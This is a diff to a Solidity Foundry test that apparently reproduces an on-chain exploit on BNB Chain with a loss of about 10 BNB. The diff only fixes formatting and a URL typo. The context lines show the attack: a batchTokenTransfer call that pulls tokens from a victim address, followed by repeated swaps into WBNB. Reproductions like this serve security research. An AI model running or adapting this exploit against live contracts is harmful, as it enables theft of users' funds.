@@ -2,7 +2,7 @@
 pragma solidity ^0.8.10;
 
 // @KeyInfo - Total Lost : ~10 $BNB
-// Attacker : hhttps://bscscan.com/address/0xc47fcc9263b026033a94574ec432514c639a2d12
+// Attacker : https://bscscan.com/address/0xc47fcc9263b026033a94574ec432514c639a2d12
 // Attack Contract : https://bscscan.com/address/0x0d3aafb9ade835456b2595509ac1f58922e465b3
 // Vulnerable Contract : https://bscscan.com/address/0xdb103fd28ca4b18115f5ce908baaeed7e0f1f101
 // Attack Tx : https://bscscan.com/tx/0x346f65ac333eb6d69886f5614aaf569a561a53a8d93db4384bd7c0bec15ae9f6
@@ -49,13 +49,15 @@ contract ContractTest is Test {
             Token[i] = 999_999_999_999_400;
         }
 
-        MultiSender.batchTokenTransfer{value: 1 ether}(Victim, Attack, Token, address(MyAi), 999_999_999_999_400 * 100, true);
+        MultiSender.batchTokenTransfer{value: 1 ether}(
+            Victim, Attack, Token, address(MyAi), 999_999_999_999_400 * 100, true
+        );
         for (uint256 i = 0; i < 100; i++) {
             TOKENToWBNB();
         }
         emit log_named_decimal_uint("Attacker WBNB balance before attack", WBNB.balanceOf(address(this)), 18);
     }
-    
+
     function TOKENToWBNB() internal {
         address[] memory path = new address[](2);
         path[0] = address(MyAi);
@@ -64,7 +66,7 @@ contract ContractTest is Test {
             999_999_999_999_400, 0, path, address(this), block.timestamp
         );
     }
-    
+
     fallback() external payable {}
     receive() external payable {}
 }
